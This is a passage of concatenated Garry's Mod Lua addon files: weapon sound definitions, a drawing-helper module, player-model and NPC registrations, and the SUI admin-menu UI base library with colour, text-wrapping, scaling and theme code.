	volume = 		0.1,
	sound = 			"weapons/fnscarh/aug_clipin.mp3"
})

//fn fal
sound.Add({
	name = 			"fnfal.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = "weapons/fn_fal/galil-1.wav"
})

sound.Add({
	name = 			"Weapon_fnfal.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fn_fal/galil_clipout.mp3" 
})

sound.Add({
	name = 			"Weapon_fnfal.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fn_fal/galil_clipin.mp3" 
})

sound.Add({
	name = 			"Weapon_fnfal.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fn_fal/galil_boltpull.mp3" 
})

//hk 416
sound.Add({
	name = 			"hk416weapon.SilencedSingle",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = "weapons/twinkie_hk416/m4a1-1.wav"
})

sound.Add({
	name = 			"hk416weapon.UnsilSingle",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = "weapons/twinkie_hk416/m4a1_unsil-1.wav"
})

sound.Add({
	name = 			"hk416weapon.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_clipout.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Magtap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_tap.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_clipin.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_boltpull.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Boltrelease",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_boltrelease.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Deploy",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_deploy.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Silencer_On",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_silencer_on.mp3"	
})

sound.Add({
	name = 			"hk416weapon.Silencer_Off",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/twinkie_hk416/m4a1_silencer_off.mp3"	
})

//G3
sound.Add({
	name = 			"hk_g3_weapon.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = "weapons/hk_g3/galil-1.wav"
})

sound.Add({
	name = 			"hk_g3_weapon.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/hk_g3/galil_clipout.mp3"	
})

sound.Add({
	name = 			"hk_g3_weapon.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/hk_g3/galil_clipin.mp3"	
})

sound.Add({
	name = 			"hk_g3_weapon.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/hk_g3/boltpull.mp3"	
})

sound.Add({
	name = 			"hk_g3_weapon.Boltforward",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/hk_g3/boltforward.mp3"	
})

sound.Add({
	name = 			"hk_g3_weapon.cloth",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/hk_g3/Cloth.mp3"	
})

sound.Add({
	name = 			"hk_g3_weapon.draw",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/hk_g3/draw.mp3"	
})


assault_autorun_mounted = true
--PATH addons/radial_menu/lua/nexus_framework/vgui/modules/draw.lua:

local framework = Nexus:ClassManager("Framework")
local _draw = draw
local draw = framework:Class("Draw")

local sin = math.sin 
local cos = math.cos 
local rad = math.rad

local surface = surface 
local render = render 

draw:Add("Arc", function(self, cx, cy, radius, thickness, startang, endang, roughness,color)
	surface.SetDrawColor(color)

	local arc = self:Call("PrecacheArc", 
		cx,
		cy,
		radius,
		thickness,
		startang,
		endang,
		roughness
	)

	for i, vertex in ipairs(arc) do
		surface.DrawPoly(vertex)
	end
end)

draw:Add("PrecacheArc", function(self, cx, cy, radius, thickness, startang, endang, roughness)
	local triarc = {}
	local roughness = math.max(roughness or 1, 1)
	local step = roughness
	local startang,endang = startang or 0, endang or 0
	
	if startang > endang then
		step = math.abs(step) * -1
	end
	
	local inner = {}
	local r = radius - thickness
	for deg=startang, endang, step do
		local rad = rad(deg)
		local ox, oy = cx+(cos(rad)*r), cy+(-sin(rad)*r)
		table.insert(inner, {
			x=ox,
			y=oy,
			u=(ox-cx)/radius + .5,
			v=(oy-cy)/radius + .5,
		})
	end	
	
	local outer = {}
	for deg=startang, endang, step do
		local rad = rad(deg)
		local ox, oy = cx+(cos(rad)*radius), cy+(-sin(rad)*radius)
		table.insert(outer, {
			x=ox,
			y=oy,
			u=(ox-cx)/radius + .5,
			v=(oy-cy)/radius + .5,
		})
	end	
	
	for tri=1,#inner*2 do
		local p1,p2,p3
		p1 = outer[math.floor(tri/2)+1]
		p3 = inner[math.floor((tri+1)/2)+1]
		if tri%2 == 0 then
			p2 = outer[math.floor((tri+1)/2)]
		else
			p2 = inner[math.floor((tri+1)/2)]
		end
	
		table.insert(triarc, {p1,p2,p3})
	end
	
	return triarc
end)

draw:Add("CachedArc",function(self,arc,col)

	surface.SetDrawColor(col)
	for i, vertex in ipairs(arc) do
		surface.DrawPoly(vertex)
	end	

end)

local blur = Material("pp/blurscreen")
draw:Add("Blur", function(self, panel, intensivity, d)
	local x, y = panel:LocalToScreen()
	surface.SetDrawColor(color_white)
	surface.SetMaterial(blur)

	for i = 1, intensivity do
		blur:SetFloat("$blur", (i / d) * intensivity)
		blur:Recompute()

		render.UpdateScreenEffectTexture()

		surface.DrawTexturedRect(-x, -y, ScrW(), ScrH())
	end
end)
draw:Add("BlurHUD", function(self, x, y, w, h, amt)
	local X, Y = 0,0

	surface.SetDrawColor(255,255,255)
	surface.SetMaterial(blur)

	for i = 1, amt or 5 do
		blur:SetFloat("$blur", (i / 3) * (5))
		blur:Recompute()

		render.UpdateScreenEffectTexture()

		render.SetScissorRect(x, y, x+w, y+h, true)
			surface.DrawTexturedRect(X * -1, Y * -1, ScrW(), ScrH())
		render.SetScissorRect(0, 0, 0, 0, false)
	end
end)

draw:Add("PrecacheCircle", function(self, sx, sy, radius, vertexCount, angle)
	local vertices = {}
	local ang = -rad(angle or 0)
	local c = cos(ang)
	local s = sin(ang)
	for i = 0, 360, 360 / vertexCount do
		local radd = rad(i)
		local x = cos(radd)
		local y = sin(radd)

		local tempx = x * radius * c - y * radius * s + sx
		y = x * radius * s + y * radius * c + sy
		x = tempx

		vertices[#vertices + 1] = {
			x = x, 
			y = y, 
			u = u, 
			v = v 
		}
	end

	return vertices 
end)

draw:Add("Circle", function(self, sx, sy, radius, vertexCount, color, angle)
	
	local vertices = self:Call("PrecacheCircle", 
		sx,
		sy,
		radius,
		vertexCount,
		angle
	)

	if vertices and #vertices > 0 then
		_draw.NoTexture()
		surface.SetDrawColor(color)
		surface.DrawPoly(vertices)
	end
end)

draw:Add("CachedCircle", function(self,circle,color)
	if circle and #circle > 0 then
		_draw.NoTexture()
		surface.SetDrawColor(color)
		surface.DrawPoly(circle)
	end
end)

draw:Add("ShadowText", function(self, str, font, x, y, col, xAlign, yAlign)
	_draw.SimpleText(str, font, x - 1, y - 1, color_black, xAlign, yAlign)
	_draw.SimpleText(str, font, x - 1, y + 1, color_black, xAlign, yAlign)
	_draw.SimpleText(str, font, x + 1, y - 1, color_black, xAlign, yAlign)
	_draw.SimpleText(str, font, x + 1, y + 1, color_black, xAlign, yAlign)
	
	_draw.SimpleText(str, font, x, y, col, xAlign, yAlign)
end)

local mat_white = Material("vgui/white")
draw:Add("SimpleLinearGradient", function(self, x, y, w, h, startColor, endColor, horizontal)
	self:Call("LinearGradient", x, y, w, h, { {offset = 0, color = startColor}, {offset = 1, color = endColor} }, horizontal)
end)

draw:Add("LinearGradient", function(self, x, y, w, h, stops, horizontal)
	if #stops == 0 then
		return
	elseif #stops == 1 then
		surface.SetDrawColor(stops[1].color)
		surface.DrawRect(x, y, w, h)
		return
	end

	table.SortByMember(stops, "offset", true)

	render.SetMaterial(mat_white)
	mesh.Begin(MATERIAL_QUADS, #stops - 1)
	for i = 1, #stops - 1 do
		local offset1 = math.Clamp(stops[i].offset, 0, 1)
		local offset2 = math.Clamp(stops[i + 1].offset, 0, 1)
		if offset1 == offset2 then continue end

		local deltaX1, deltaY1, deltaX2, deltaY2

		local color1 = stops[i].color
		local color2 = stops[i + 1].color

		local r1, g1, b1, a1 = color1.r, color1.g, color1.b, color1.a
		local r2, g2, b2, a2
		local r3, g3, b3, a3 = color2.r, color2.g, color2.b, color2.a
		local r4, g4, b4, a4

		if horizontal then
			r2, g2, b2, a2 = r3, g3, b3, a3
			r4, g4, b4, a4 = r1, g1, b1, a1
			deltaX1 = offset1 * w
			deltaY1 = 0
			deltaX2 = offset2 * w
			deltaY2 = h
		else
			r2, g2, b2, a2 = r1, g1, b1, a1
			r4, g4, b4, a4 = r3, g3, b3, a3
			deltaX1 = 0
			deltaY1 = offset1 * h
			deltaX2 = w
			deltaY2 = offset2 * h
		end

		mesh.Color(r1, g1, b1, a1)
		mesh.Position(Vector(x + deltaX1, y + deltaY1))
		mesh.AdvanceVertex()

		mesh.Color(r2, g2, b2, a2)
		mesh.Position(Vector(x + deltaX2, y + deltaY1))
		mesh.AdvanceVertex()

		mesh.Color(r3, g3, b3, a3)
		mesh.Position(Vector(x + deltaX2, y + deltaY2))
		mesh.AdvanceVertex()

		mesh.Color(r4, g4, b4, a4)
		mesh.Position(Vector(x + deltaX1, y + deltaY2))
		mesh.AdvanceVertex()
	end
	mesh.End()
end)

draw:Add("MaskInclude", function(self, maskFunc, renderFunc)
	render.ClearStencil()
	render.SetStencilEnable(true)
	render.DepthRange(0, 1)

	render.SetStencilWriteMask(1)
	render.SetStencilTestMask(1)

	render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
	render.SetStencilPassOperation(STENCILOPERATION_ZERO)
	render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_NEVER)
	render.SetStencilReferenceValue(1)

	maskFunc()

	render.SetStencilFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilPassOperation(STENCILOPERATION_REPLACE)
	render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_EQUAL)
	render.SetStencilReferenceValue(1)

	renderFunc()

	render.DepthRange(0, 1)
	render.SetStencilEnable(false)
	render.ClearStencil()
end)

draw:Add("MaskExclude", function(self, maskFunc, renderFunc)
	render.ClearStencil()
	render.SetStencilEnable(true)
	render.DepthRange(0, 1)

	render.SetStencilWriteMask(1)
	render.SetStencilTestMask(1)

	render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
	render.SetStencilPassOperation(STENCILOPERATION_REPLACE)
	render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_NEVER)
	render.SetStencilReferenceValue(1)

	maskFunc()

	render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
	render.SetStencilPassOperation(STENCILOPERATION_REPLACE)
	render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
	render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_EQUAL)
	render.SetStencilReferenceValue(0)

	renderFunc()

	render.DepthRange(0, 1)
	render.SetStencilEnable(false)
	render.ClearStencil()
end)
--PATH addons/pm_cp_mix_models/lua/autorun/police_playermodels.lua:
local function AddPlayerModel( name, model )

    list.Set( "PlayerOptionsModel", name, model )
    player_manager.AddValidModel( name, model )
    
end

AddPlayerModel( "Danish Police 1","models/player/politi_1/male_01.mdl")
AddPlayerModel( "Danish Police 2","models/player/politi_1/male_02.mdl")
--PATH addons/tda_ribbon_girl_miku_1626505237/lua/autorun/ribbon_girl_miku.lua:
player_manager.AddValidModel( "TDA Ribbon Girl Miku", "models/player/dewobedil/vocaloid/ribbon_girl_miku/default_p.mdl" );
player_manager.AddValidHands( "TDA Ribbon Girl Miku", "models/player/dewobedil/vocaloid/ribbon_girl_miku/c_arms/default_p.mdl", 0, "00000000" )

--View hands code credits: https://steamcommunity.com/id/libertyforce/
if CLIENT then
 
    local function Viewmodel( vm, ply, weapon )
        if CLIENT then
            if ply:GetModel() == "models/player/dewobedil/vocaloid/ribbon_girl_miku/default_p.mdl" then
                local skin = ply:GetSkin()
                local hand_band = ply:GetBodygroup( 6 ) -- Use the ID of the playermodel's bodygroup
                local hands = ply:GetHands()
                if ( weapon.UseHands or !weapon:IsScripted() ) then
                    if ( IsValid( hands ) ) then
                        hands:DrawModel()
                        hands:SetSkin( skin ) -- In case you want to change skin too
                        hands:SetBodygroup( 1 , hand_band ) -- Use the ID of the c_hands bodygroup
                    end
                end
            end
        end
    end
    hook.Add( "PostDrawViewModel", "ribbon_girl_miku", Viewmodel )
 
end

local Category = "Vocaloid"

local NPC =
{
	Name = "TDA Ribbon Girl Miku (Friendly)",
	Class = "npc_citizen",
	Health = "100",
	KeyValues = { citizentype = 4 },
	Model = "models/player/dewobedil/vocaloid/ribbon_girl_miku/default_f.mdl",
	Category = Category
}

list.Set( "NPC", "npc_ribbon_girl_miku_f", NPC )

local NPC =
{
	Name = "TDA Ribbon Girl Miku (Enemy)",
	Class = "npc_combine_s",
	Health = "100",
	Numgrenades = "4",
	Model = "models/player/dewobedil/vocaloid/ribbon_girl_miku/default_e.mdl",
	Weapons = { "weapon_pistol" },
	Category = Category
}

list.Set( "NPC", "npc_ribbon_girl_miku_e", NPC )
--PATH addons/_adminmodules_menu/lua/sui/cl_base.lua:
local hook = hook
local bit = bit
local math = math

local Color = Color
local ipairs = ipairs
local RealFrameTime = RealFrameTime

local color_white = color_white
local color_black = color_black

local sui = sui

local isfunction = sui.isfunction
local isstring = sui.isstring

local floor = math.floor

function sui.scale(v)
	return ScrH() * (v / 900)
end

function sui.hex_rgb(hex)
	hex = tonumber(hex:gsub("^([%w])([%w])([%w])$", "%1%1%2%2%3%3", 1), 16)

	return Color(
		bit.band(bit.rshift(hex, 16), 0xFF),
		bit.band(bit.rshift(hex, 8), 0xFF),
		bit.band(hex, 0xFF)
	)
end

function sui.rgb_hex(c)
	return bit.tohex((c.r * 0x10000) + (c.g * 0x100) + c.b, 6)
end
local rgb_hex = sui.rgb_hex

function sui.lerp_color(from, to)
	local frac = RealFrameTime() * 10
	from.r = Lerp(frac, from.r, to.r)
	from.g = Lerp(frac, from.g, to.g)
	from.b = Lerp(frac, from.b, to.b)
	from.a = Lerp(frac, from.a, to.a)
end

do
	local colors = {
		["41b9ff"] = Color(44, 62, 80),
		["00c853"] = Color(44, 62, 80),
		["181818"] = Color(242, 241, 239),
		["212121"] = Color(242, 241, 239),
	}

	function sui.contrast_color(color)
		local c = colors[rgb_hex(color)]
		if c then return c end

		local luminance = (0.299 * color.r + 0.587 * color.g + 0.114 * color.b) / 255
		return luminance > 0.5 and color_black or color_white
	end
end

do
	local SetDrawColor = surface.SetDrawColor
	local SetMaterial = surface.SetMaterial
	local DrawTexturedRectRotated = surface.DrawTexturedRectRotated
	function sui.draw_material(mat, x, y, size, col, rot)
		SetDrawColor(col)

		if x == -1 then
			x = size / 2
		end

		if y == -1 then
			y = size / 2
		end

		if mat then
			SetMaterial(mat)
		end

		DrawTexturedRectRotated(x, y, size, size, rot or 0)
	end
end

do
	local hsv_t = {
		[0] = function(v, p, q, t)
			return v, t, p
		end,
		[1] = function(v, p, q, t)
			return q, v, p
		end,
		[2] = function(v, p, q, t)
			return p, v, t
		end,
		[3] = function(v, p, q, t)
			return p, q, v
		end,
		[4] = function(v, p, q, t)
			return t, p, v
		end,
		[5] = function(v, p, q, t)
			return v, p, q
		end
	}

	function sui.hsv_to_rgb(h, s, v)
		local i = floor(h * 6)
		local f = h * 6 - i

		return hsv_t[i % 6](
			v * 255, -- v
			(v * (1 - s)) * 255, -- p
			(v * (1 - f * s)) * 255, -- q
			(v * (1 - (1 - f) * s)) * 255 -- t
		)
	end
end

local Panel = FindMetaTable("Panel")
local SetSize = Panel.SetSize
local GetWide = Panel.GetWide
local GetTall = Panel.GetTall
function sui.scaling_functions(panel)
	local scale_changed
	local SUI = CURRENT_SUI

	local dock_top = function(s, h)
		if not h then return end

		if not scale_changed then
			s.real_h = h
		end

		if not s.no_scale then
			h = SUI.Scale(h)
		end

		if GetTall(s) == h then return end

		SetSize(s, GetWide(s), h)
	end

	local dock_right = function(s, w)
		if not w then return end

		if not scale_changed then
			s.real_w = w
		end

		if not s.no_scale then
			w = SUI.Scale(w)
		end

		if GetWide(s) == w then return end

		SetSize(s, w, GetTall(s))
	end

	local size_changed = function(s, w, h)
		if s.using_scale then return end

		s.using_scale = true

		local dock = s:GetDock()

		if dock ~= FILL then
			if dock == NODOCK then
				dock_top(s, h)
				dock_right(s, w)
			elseif dock == TOP or dock == BOTTOM then
				dock_top(s, h)
			else
				dock_right(s, w)
			end
		end

		s.using_scale = nil
	end

	local wide_changed = function(s, w)
		size_changed(s, w)
	end

	local tall_changed = function(s, h)
		size_changed(s, nil, h)
	end

	function panel:ScaleChanged()
		scale_changed = true
		size_changed(self, self.real_w, self.real_h)
		scale_changed = nil
		if self.OnScaleChange then
			self:OnScaleChange()
		end
	end

	local on_remove = function(s)
		SUI.RemoveScaleHook(s)
	end

	function panel:ScaleInit()
		self.SetSize = size_changed
		self.SetWide = wide_changed
		self.SetTall = tall_changed
		SUI.OnScaleChanged(self, self.ScaleChanged)
		self:On("OnRemove", on_remove)
	end
end

do
	local utf8 = {}

	local str_rel_to_abs = function(str, v, str_n)
		return v > 0 and v or math.max(str_n + v + 1, 1)
	end

	local utf8_decode = function(str, start_pos, str_n)
		start_pos = str_rel_to_abs(str, start_pos or 1, str_n)

		local b1 = str:byte(start_pos, start_pos)
		if not b1 then return nil end
		if b1 < 0x80 then return start_pos, start_pos, b1 end
		if b1 > 0xF4 or b1 < 0xC2 then return nil end

		local cont_byte_count = b1 >= 0xF0 and 3 or b1 >= 0xE0 and 2 or b1 >= 0xC0 and 1
		local end_pos = start_pos + cont_byte_count
		local code_point = 0

		if str_n < end_pos then return nil end

		local bytes = {str:byte(start_pos + 1, end_pos)}
		for i = 1, #bytes do
			local b_x = bytes[i]
			if bit.band(b_x, 0xC0) ~= 0x80 then return nil end
			code_point = bit.bor(bit.lshift(code_point, 6), bit.band(b_x, 0x3F))
			b1 = bit.lshift(b1, 1)
		end

		code_point = bit.bor(code_point, bit.lshift(bit.band(b1, 0x7F), cont_byte_count * 5))

		return start_pos, end_pos, code_point
	end

	local replacement = string.char(239, 191, 189)

	function utf8.force(str)
		local end_pos = #str
		if end_pos == 0 then return str, end_pos end

		local ret = ""
		local cur_pos = 1

		repeat
			local seq_start_pos, seq_end_pos = utf8_decode(str, cur_pos, end_pos)

			if not seq_start_pos then
				ret = ret .. replacement
				cur_pos = cur_pos + 1
			else
				ret = ret .. str:sub(seq_start_pos, seq_end_pos)
				cur_pos = seq_end_pos + 1
			end
		until cur_pos > end_pos

		return ret, #ret
	end

	-- https://gist.github.com/gdeglin/4128882

	local utf8_char_bytes = function(c)
		if c > 0 and c <= 127 then
			return 1
		elseif c >= 194 and c <= 223 then
			return 2
		elseif c >= 224 and c <= 239 then
			return 3
		elseif c >= 240 and c <= 244 then
			return 4
		end
	end
	utf8.char_bytes = utf8_char_bytes

	function utf8.len(str)
		local length = #str

		local len = 0

		local pos = 1
		while pos <= length do
			len = len + 1
			pos = pos + utf8_char_bytes(str:byte(pos))
		end

		return len
	end

	function utf8.sub(str, i, j)
		j = j or -1

		if i == nil then return "" end

		local l = (i >= 0 and j >= 0) or utf8.len(str)
		local start_char = (i >= 0) and i or l + i + 1
		local end_char = (j >= 0) and j or l + j + 1

		if start_char > end_char then return "" end

		local pos = 1
		local length = #str
		local len = 0

		local start_byte, end_byte = 1, length

		while pos <= length do
			len = len + 1

			if len == start_char then
				start_byte = pos
			end

			pos = pos + utf8_char_bytes(str:byte(pos))

			if len == end_char then
				end_byte = pos - 1
				break
			end
		end

		return str:sub(start_byte, end_byte)
	end

	sui.utf8 = utf8
end

--
-- thanks falco!
-- https://github.com/FPtje/DarkRP/blob/4fd2c3c315427e79bb7624702cfaefe9ad26ac7e/gamemode/modules/base/cl_util.lua#L42
--
do
	local utf8 = utf8
	local surface = surface

	local max_width, original_width, can_fix

	local fix_width = function()
		if can_fix then
			can_fix = false
			max_width = original_width
		end
	end

	local char_wrap = function(text, remaining_width)
		local total_width  = 0

		local new_text = ""
		for char in text:gmatch(utf8.charpattern) do
			total_width  = total_width  + surface.GetTextSize(char)
			if total_width >= remaining_width then
				total_width = surface.GetTextSize(char)
				fix_width()
				remaining_width = max_width

				new_text = new_text .. ("\n" .. char)
			else
				new_text = new_text .. char
			end
		end

		return new_text, total_width
	end

	function sui.wrap_text(text, font, width, first_width)
		text = sui.utf8.force(text)

		local total_width = 0
		can_fix = first_width and true or false
		max_width, original_width = first_width or width, width

		surface.SetFont(font)

		local space_width = surface.GetTextSize(" ")

		text = text:gsub("(%s?[%S]*)", function(word)
			local char = word:sub(1, 1)
			if char == "\n" then
				total_width = 0
				fix_width()
			end

			local wordlen = surface.GetTextSize(word)
			total_width = total_width + wordlen

			if wordlen >= max_width then
				local split_word
				split_word, total_width = char_wrap(word, max_width - (total_width - wordlen))
				return split_word
			elseif total_width < max_width then
				return word
			end

			fix_width()

			total_width = wordlen

			if char == " " then
				total_width = total_width - space_width
				return "\n" .. word:sub(2)
			end

			return "\n" .. word
		end)

		return text
	end
end

function sui.register(classname, panel_table, parent_class)
	sui.TDLib.Install(panel_table)

	if not panel_table.Add then
		function panel_table:Add(pnl)
			return vgui.Create(pnl, self)
		end
	end

	if not panel_table.NoOverrideClear and not panel_table.Clear then
		function panel_table:Clear()
			local children = self:GetChildren()
			for i = 1, #children do
				children[i]:Remove()
			end
		end
	end

	local SUI = CURRENT_SUI

	for k, v in pairs(SUI.panels_funcs) do
		panel_table[k] = v
	end

	panel_table.SUI_GetColor = function(name)
		return SUI.GetColor(name)
	end

	SUI.panels[classname] = panel_table

	return vgui.Register(SUI.name .. "." .. classname, panel_table, parent_class)
end

local Material; do
	local C_Material, material_str = select(2, debug.getupvalue(_G.Material, 1)), "0001010" -- [["mips smooth"]]
	Material = function(name)
		return C_Material(name, material_str)
	end
end
sui.Material = Material

local function prepare_theme(theme)
	for k, v in pairs(theme) do
		if IsColor(v) then continue end

		if istable(v) then
			prepare_theme(v)
		elseif isstring(v) and v:sub(1, 1) == "#" then
			theme[k] = sui.hex_rgb(v:sub(2))
		end
	end
end

function sui.new(addon_name, default_scaling, panels_funcs)
	local SUI = {
		name = addon_name,
		panels = {},
		panels_funcs = panels_funcs or {}
	}

	CURRENT_SUI = SUI

	do
		local themes = table.Copy(sui.themes)
		local current_theme_table

		function SUI.GetColor(color_name)
			return current_theme_table[color_name]
		end

		function SUI.SetTheme(theme_name)
			SUI.current_theme = theme_name
			current_theme_table = themes[theme_name]
			hook.Call(addon_name .. ".ThemeChanged")
		end

		function SUI.GetThemes()
			return themes
		end

		function SUI.AddToTheme(theme_name, tbl)
			local theme = themes[theme_name]
			for k, v in pairs(tbl) do
				theme[k] = v
			end
			prepare_theme(theme)
		end

		function SUI.RemoveTheme(theme_name)
			themes[theme_name] = nil
			if theme_name == SUI.current_theme then
				SUI.SetTheme(next(themes))
			end
		end

		function SUI.AddTheme(theme_name, tbl)
			prepare_theme(tbl)
			themes[theme_name] = tbl
		end

		SUI.themes = themes
	end

	local Scale
	do
		local scale = 1

		if default_scaling then
			SUI.Scale = sui.scale
		else
			function SUI.Scale(v)
				return floor((v * scale) + 0.5)
			end
		end
		Scale = SUI.Scale

		function SUI.ScaleEven(v)
			v = Scale(v)
			if v % 2 ~= 0 then
				v = v + 1
			end
			return v
		end

		function SUI.SetScale(_scale)
			if _scale == scale then return end

			scale = _scale
			SUI.scale = _scale

			for k, v in pairs(SUI.fonts) do
				SUI.CreateFont(k:sub(#addon_name + 1), v.font, v.size, v.weight)
			end

			SUI.CallScaleChanged()
		end

		local n = 0
		local keys = {}
		local hooks = {}
		_G[addon_name .. "_HOOKS"] = keys
		_G[addon_name .. "_KEYS"] = hooks
		_G[addon_name .. "_N"] = function()
			return n
		end
		function SUI.OnScaleChanged(name, func)
			if not isfunction(func) then
				error("Invalid function?")
			end

			if not name then
				error("Invalid name?")
			end

			if not isstring(name) then
				local _func = func
				func = function()
					local isvalid = name.IsValid
					if isvalid and isvalid(name) then
						_func(name)
					else
						SUI.RemoveScaleHook(name, true)
					end
				end
			end

			local pos = keys[name]
			if pos then
				hooks[pos + 1] = func
			else
				hooks[n + 1] = name
				hooks[n + 2] = func
				keys[name] = n + 1
				n = n + 2
			end
		end

		function SUI.RemoveScaleHook(name, in_hook)
			local pos = keys[name]
			if not pos then return end

			if in_hook then
				hooks[pos] = nil
				hooks[pos + 1] = nil
			else
				local new_name = hooks[n - 1]
				if new_name then
					hooks[pos], hooks[pos + 1] = new_name, hooks[n]
					hooks[n - 1], hooks[n] = nil, nil
					keys[new_name] = pos
				end
				n = n - 2
			end
			keys[name] = nil
		end

		function SUI.CallScaleChanged()
			if n == 0 then return end

			local i, c_n = 2, n
			::loop::
			local func = hooks[i]
			if func then
				func()
				i = i + 2
			else
				local _n, _i = c_n, i
				if n ~= c_n then
					_n = n
					i = i + 2
				else
					c_n = c_n - 2
				end

				local new_name = hooks[_n - 1]
				if new_name then
					hooks[_i - 1], hooks[_i] = new_name, hooks[_n]
					hooks[_n - 1], hooks[_n] = nil, nil
					keys[new_name] = _i - 1
				end

				n = n - 2
			end

			if i <= c_n then
				goto loop
			end
		end

		function SUI.GetScale()
			return scale
		end

		SUI.scale = 1
	end

	do
		local fonts = {}

		function SUI.CreateFont(font_name, font, size, weight)
			font_name = addon_name .. font_name

			fonts[font_name] = fonts[font_name] or {
				font = font,
				size = size,
				weight = weight
			}

			surface.CreateFont(font_name, {
				font = font,
				size = Scale(size),
				weight = weight,
				extended = true
			})

			return font_name
		end

		function SUI.GetFont(font_name)
			return addon_name .. font_name
		end

		function SUI.GetFontHeight(font_name)
			local font = fonts[addon_name .. font_name] or fonts[font_name]
			if not font then return 0 end

			return floor(Scale(font.size or 0))
		end

		SUI.fonts = fonts
	end

	do
		local materials = {}

		local delay = 0.008
		local next_run = UnPredictedCurTime()

		function SUI.Material(mat, allow_delay)
			local _mat = materials[mat]
			if _mat then return _mat end

			if allow_delay then
				if UnPredictedCurTime() < next_run then return end
				next_run = UnPredictedCurTime() + delay
			end

			materials[mat] = Material(mat)

			return materials[mat]
		end

		SUI.materials = materials
	end

	SUI.SetTheme("Dark")

	for _, f in ipairs(file.Find("sui/vgui/sui_*.lua", "LUA")) do
		include("sui/vgui/" .. f)
	end

	for _, f in ipairs(file.Find(string.format("sui/vgui/%s_*.lua", addon_name:lower()), "LUA")) do
		include("sui/vgui/" .. f)
	end

	return SUI
end

sui.themes = sui.themes or {}
function sui.add_theme(name, tbl)
	prepare_theme(tbl)
	sui.themes[name] = tbl
end

function sui.valid_options()
	local objs = {}
	objs.IsValid = function()
		local valid = true
		for i = 1, #objs do
			local obj = objs[i]
			if obj:IsValid() and obj.valid == false then
				valid = false
				break
			end
		end
		return valid
	end
	objs.Add = function(obj)
		table.insert(objs, obj)
	end
	return objs
end

do
	local SURFACE = Color(31, 31, 31)
	local PRIMARY = Color(65, 185, 255)

	local ON_SURFACE = Color(255, 255, 255)
	local ON_SURFACE_HIGH_EMPHASIS = ColorAlpha(ON_SURFACE, 221)
	local ON_SURFACE_MEDIUM_EMPHASIS = ColorAlpha(ON_SURFACE, 122)
	local ON_SURFACE_DISABLED = ColorAlpha(ON_SURFACE, 97)

	local ON_PRIMARY = Color(60, 60, 60)

	sui.add_theme("Dark", {
		frame = Color(18, 18, 18),
		frame_blur = false,

		title = ON_SURFACE,
		header = SURFACE,

		close = ON_SURFACE_MEDIUM_EMPHASIS,
		close_hover = Color(255, 60, 60),
		close_press = Color(255, 255, 255, 30),

		button = PRIMARY,
		button_text = "#050709",
		button_hover = ColorAlpha(ON_PRIMARY, 100),
		button_click = ColorAlpha(ON_PRIMARY, 240),
		button_disabled = Color(100, 100, 100),
		button_disabled_text = "#bdbdbd",

		button2_hover = ColorAlpha(PRIMARY, 5),
		button2_selected = ColorAlpha(PRIMARY, 15),

		scroll = ColorAlpha(PRIMARY, 97),
		scroll_grip = PRIMARY,

		scroll_panel = Color(29, 29, 29),
		scroll_panel_outline = false,

		text_entry_bg = Color(34, 34, 34),
		text_entry_bar_color = Color(0, 0, 0, 0),
		text_entry = ON_SURFACE_HIGH_EMPHASIS,
		text_entry_2 = ON_SURFACE_MEDIUM_EMPHASIS,
		text_entry_3 = PRIMARY,

		property_sheet_bg = Color(39, 39, 39),
		property_sheet_tab = Color(150, 150, 150),
		property_sheet_tab_click = Color(255, 255, 255, 30),
		property_sheet_tab_active = PRIMARY,

		toggle_button = ON_SURFACE_DISABLED,
		toggle_button_switch = ON_SURFACE_HIGH_EMPHASIS,

		toggle_button_active = ColorAlpha(PRIMARY, 65),
		toggle_button_switch_active = PRIMARY,

		slider_knob = PRIMARY,
